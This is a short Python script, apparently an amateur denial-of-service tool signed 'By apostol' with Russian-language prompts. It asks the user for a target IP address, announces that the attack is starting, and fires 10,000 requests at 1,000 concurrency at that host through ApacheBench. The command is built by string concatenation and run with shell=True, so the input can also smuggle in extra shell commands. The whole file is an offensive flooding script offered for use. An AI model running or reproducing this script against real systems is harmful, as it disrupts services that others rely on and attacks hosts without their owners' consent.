import subprocess
import time

def ddos():
    print("By apostol")


    time.sleep(2)

    ip = input("Введите айпи адресс: ")



    time.sleep(2)

    print("Атака начинается...\n\n")
    subprocess.call("ab -n 10000 -c 1000 http://"+ip+"/", shell=True)
    print("Атака началась....")

